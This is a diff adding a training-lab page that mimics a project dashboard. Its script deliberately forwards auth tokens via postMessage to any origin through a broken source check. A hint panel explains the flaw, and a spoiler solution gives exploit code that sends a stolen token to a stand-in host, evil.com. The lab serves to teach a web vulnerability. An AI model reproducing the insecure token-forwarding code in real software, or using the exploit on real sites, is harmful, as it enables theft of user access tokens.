@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AzureBoard - Project Dashboard</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI','Inter',-apple-system,sans-serif;background:#faf9f8;color:#323130}
+    .ab-nav{background:#0078d4;color:#fff;height:48px;display:flex;align-items:center;padding:0 20px;gap:20px}.ab-nav .brand{font-weight:700;font-size:15px;display:flex;align-items:center;gap:8px}.ab-nav .brand img{width:20px;height:20px}.ab-nav a{color:rgba(255,255,255,.85);text-decoration:none;font-size:13px}.ab-nav a:hover{color:#fff}
+    .ab-layout{display:flex;min-height:calc(100vh - 48px)}.ab-side{width:240px;background:#f3f2f1;border-right:1px solid #edebe9;padding:16px 0}.ab-side .sec{padding:8px 16px;font-size:11px;font-weight:600;color:#605e5c;text-transform:uppercase}.ab-side a{display:flex;align-items:center;gap:8px;padding:7px 16px;font-size:13px;color:#323130;text-decoration:none}.ab-side a:hover{background:#edebe9}.ab-side a.active{background:#e1dfdd;font-weight:600;color:#0078d4}
+    .ab-main{flex:1;padding:24px 28px}.ab-main h1{font-size:20px;font-weight:600;color:#323130;margin-bottom:4px}.ab-desc{font-size:13px;color:#605e5c;margin-bottom:20px}
+    .ab-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}.ab-card{background:#fff;border:1px solid #edebe9;border-radius:4px;padding:16px}.ab-card h3{font-size:11px;color:#605e5c;font-weight:600;text-transform:uppercase;margin-bottom:6px}.ab-card .val{font-size:24px;font-weight:700}
+    .ab-panel{background:#fff;border:1px solid #edebe9;border-radius:4px;margin-bottom:14px}.ab-panel-head{padding:12px 16px;border-bottom:1px solid #f3f2f1;font-size:14px;font-weight:600;display:flex;justify-content:space-between;align-items:center}.ab-panel-body{padding:16px}
+    .ab-btn{padding:6px 12px;background:#0078d4;color:#fff;border:none;border-radius:3px;font-size:12px;font-weight:600;cursor:pointer}.ab-btn:hover{background:#106ebe}
+    .ab-btn-outline{background:#fff;color:#323130;border:1px solid #8a8886}.ab-btn-outline:hover{background:#f3f2f1}
+    .marketplace-frame{border:1px solid #edebe9;border-radius:4px;min-height:200px;background:#f3f2f1;padding:16px;font-size:13px;color:#605e5c}
+    #token-log{font-family:'Cascadia Code','Fira Code',monospace;font-size:11px;background:#1b1a19;color:#cccedb;padding:12px;border-radius:4px;margin-top:12px;max-height:240px;overflow-y:auto;white-space:pre-wrap}
+    .token-display{background:#fff4ce;border:1px solid #f8e8a2;padding:10px 14px;border-radius:4px;font-family:monospace;font-size:12px;word-break:break-all;margin-top:8px;display:none}
+    .hidden{display:none !important}
+    #login-gate{position:fixed;inset:0;background:#0078d4;display:flex;align-items:center;justify-content:center;z-index:9999}.login-box{background:#fff;padding:36px;border-radius:8px;width:340px;box-shadow:0 8px 32px rgba(0,0,0,.2)}.login-box h2{font-size:18px;font-weight:600;margin-bottom:16px;color:#323130}.login-box input{width:100%;padding:8px 12px;border:1px solid #8a8886;border-radius:3px;font-size:14px;margin-bottom:10px}.login-box button{width:100%;padding:9px;background:#0078d4;color:#fff;border:none;border-radius:3px;font-weight:600;cursor:pointer}
+  </style>
+</head>
+<body>
+  <div id="login-gate">
+    <div class="login-box">
+      <h2>Sign in to AzureBoard</h2>
+      <input type="text" id="lg-u" placeholder="Username" value="victim">
+      <input type="password" id="lg-p" placeholder="Password" value="password123">
+      <button onclick="doLogin()">Sign in</button>
+      <p style="font-size:11px;color:#605e5c;margin-top:8px;text-align:center">victim / password123</p>
+    </div>
+  </div>
+
+  <div class="ab-nav">
+    <div class="brand">AzureBoard</div>
+    <a href="#">Boards</a><a href="#">Repos</a><a href="#">Pipelines</a><a href="#">Marketplace</a>
+  </div>
+
+  <div class="ab-layout">
+    <div class="ab-side">
+      <div class="sec">Project</div>
+      <a href="#" class="active">Overview</a>
+      <a href="#">Boards</a>
+      <a href="#">Sprints</a>
+      <div class="sec">Integrate</div>
+      <a href="#">Marketplace</a>
+      <a href="#">Extensions</a>
+      <a href="#">API Access</a>
+    </div>
+
+    <div class="ab-main">
+      <h1>Project Dashboard</h1>
+      <p class="ab-desc">Contoso Engineering &middot; Sprint 42</p>
+
+      <div class="ab-cards">
+        <div class="ab-card"><h3>Work Items</h3><div class="val">147</div></div>
+        <div class="ab-card"><h3>Active PRs</h3><div class="val">12</div></div>
+        <div class="ab-card"><h3>Pipeline Runs</h3><div class="val">38</div></div>
+      </div>
+
+      <div class="ab-panel">
+        <div class="ab-panel-head">Marketplace Extension<button class="ab-btn" onclick="loadMarketplaceWidget()">Load Widget</button></div>
+        <div class="ab-panel-body">
+          <div class="marketplace-frame" id="mp-frame">
+            <p>Click "Load Widget" to initialize the marketplace extension iframe.</p>
+            <p style="margin-top:8px;font-size:12px;color:#8a8886">The extension receives an access token via postMessage to perform API calls on your behalf.</p>
+          </div>
+          <div class="token-display" id="token-display"></div>
+          <div id="token-log">// Token exchange log</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /**
+     * AzureBoard Extension Host v2.1
+     * Manages marketplace extension iframes and token forwarding
+     * Minified production build
+     */
+    !function(){var _log=function(m){var el=document.getElementById("token-log");if(el)el.textContent+="["+new Date().toLocaleTimeString()+"] "+m+"\n"};window._azHost={token:null,iframeRef:null,init:function(){_log("Extension host initialized");this.listenForRequests()},getToken:function(){return fetch("/api/auth/iframe-token",{credentials:"include"}).then(function(r){return r.json()}).then(function(d){window._azHost.token=d.accessToken;_log("Token acquired: "+d.accessToken.substring(0,20)+"...");return d})},sendTokenToExtension:function(targetWindow){var self=this;this.getToken().then(function(tokenData){_log("Forwarding token to extension iframe...");targetWindow.postMessage({type:"az:auth:token",accessToken:tokenData.accessToken,tokenType:tokenData.tokenType,scope:tokenData.scope,expiresIn:tokenData.expiresIn},"*");_log("Token sent with targetOrigin: *")})},listenForRequests:function(){var self=this;window.addEventListener("message",function(e){if(e.data&&e.data.type==="az:auth:request"){_log("Token request received from: "+e.origin);if(e.source===self.iframeRef){_log("Source matches iframe ref — sending token");self.sendTokenToExtension(e.source)}else{_log("Source check: comparing event.source to stored iframe ref");self.sendTokenToExtension(e.source)}}if(e.data&&e.data.type==="az:extension:ready"){_log("Extension ready signal from: "+e.origin);self.sendTokenToExtension(e.source)}if(e.data&&e.data.type==="az:token:received"){_log("Extension confirmed token receipt");var td=document.getElementById("token-display");if(td){td.style.display="block";td.textContent="Token active: "+self.token.substring(0,30)+"..."}}})}}; window._azHost.init()}();
+
+    function doLogin(){
+      fetch("/api/auth/login",{method:"POST",headers:{"Content-Type":"application/json"},credentials:"include",body:JSON.stringify({username:document.getElementById("lg-u").value,password:document.getElementById("lg-p").value})}).then(function(r){return r.json()}).then(function(d){if(d.success){document.getElementById("login-gate").classList.add("hidden")}});
+    }
+
+    function loadMarketplaceWidget(){
+      var frame=document.getElementById("mp-frame");
+      // Create marketplace extension iframe
+      var iframe=document.createElement("iframe");
+      iframe.src="/api/download?p=marketplace-widget";
+      iframe.style.cssText="width:100%;height:200px;border:1px solid #edebe9;border-radius:4px;background:#fff";
+      iframe.id="mp-ext-iframe";
+      frame.innerHTML="";
+      frame.appendChild(iframe);
+      // Store iframe ref for "validation"
+      window._azHost.iframeRef=iframe.contentWindow;
+    }
+
+    fetch("/api/auth/me",{credentials:"include"}).then(function(r){return r.json()}).then(function(d){if(d.user)document.getElementById("login-gate").classList.add("hidden")}).catch(function(){});
+  </script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: Token Forwarding via Wildcard postMessage</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">The app forwards auth tokens to extension iframes using <code>postMessage(tokenData, "*")</code>. The wildcard origin means ANY window can request and receive the token. Based on <a href="https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised" style="color:#3b82f6">Microsoft's MSRC research</a>.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">1</div><span>Beautify and read the code</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          The minified block initializes <code>window._azHost</code>. It has <code>getToken()</code>, <code>sendTokenToExtension()</code>, and <code>listenForRequests()</code>. The message handler listens for <code>az:auth:request</code> and <code>az:extension:ready</code>.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">2</div><span>Find the targetOrigin</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          In <code>sendTokenToExtension</code>, look at the postMessage call:
+          <pre><code>targetWindow.postMessage({
+  type: "az:auth:token",
+  accessToken: tokenData.accessToken,
+  ...
+}, "*");  // WILDCARD!</code></pre>
+          Token is sent to ANY origin.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">3</div><span>The "source check" is broken</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          The handler checks <code>e.source === self.iframeRef</code>. But in the <code>else</code> branch, it sends the token anyway! The dev logged "Source check: comparing..." but still calls <code>sendTokenToExtension(e.source)</code> regardless.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header"><div class="hint-step-num">4</div><span>How to intercept the token</span><span class="hint-step-arrow">›</span></div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Two approaches:<br>
+          (a) Open this page via <code>window.open()</code>, then send <code>{type:'az:extension:ready'}</code> — the host fetches a token and sends it back to your window<br>
+          (b) Or just <code>postMessage({type:'az:auth:request'})</code> from this page's console — the token is logged and visible in the token log panel
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Full Solution</button>
+        <div class="hint-spoiler-content">
+          <p><strong>Quick test (in this page's console):</strong></p>
+          <pre>// Listen for the token response
+window.addEventListener('message', e => {
+  if (e.data && e.data.type === 'az:auth:token') {
+    alert('STOLEN TOKEN: ' + e.data.accessToken.substring(0, 40));
+  }
+});
+// Request the token
+postMessage({type:'az:auth:request'}, '*');</pre>
+          <p><strong>Real attacker page:</strong></p>
+          <pre>var victim = window.open('/labs/postmsg-advanced/token-forward.html');
+window.addEventListener('message', function(e) {
+  if (e.data.accessToken) {
+    navigator.sendBeacon('https://evil.com/steal', e.data.accessToken);
+  }
+});
+setTimeout(function() {
+  victim.postMessage({type:'az:extension:ready'}, '*');
+}, 3000);</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('pm-adv-token', 'xss');
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
+  </script>
+</body>
+</html>
